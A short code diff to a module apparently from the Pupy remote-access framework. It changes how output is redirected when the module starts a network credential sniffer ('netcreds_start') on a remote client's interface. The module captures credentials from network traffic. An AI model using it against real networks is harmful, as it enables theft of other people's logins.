@@ -25,7 +25,7 @@ class NetCreds(PupyModule):
 
     def run(self, args):
         if args.action=="start":
-            with redirected_stdio(self.client.conn): #to see the output exception in case of error
+            with redirected_stdio(self): #to see the output exception in case of error
                 r = self.client.conn.modules["pupyutils.netcreds"].netcreds_start(args.interface, args.filterip)
                 if r == 'not_root':
                     self.error("Needs root privileges to be started")
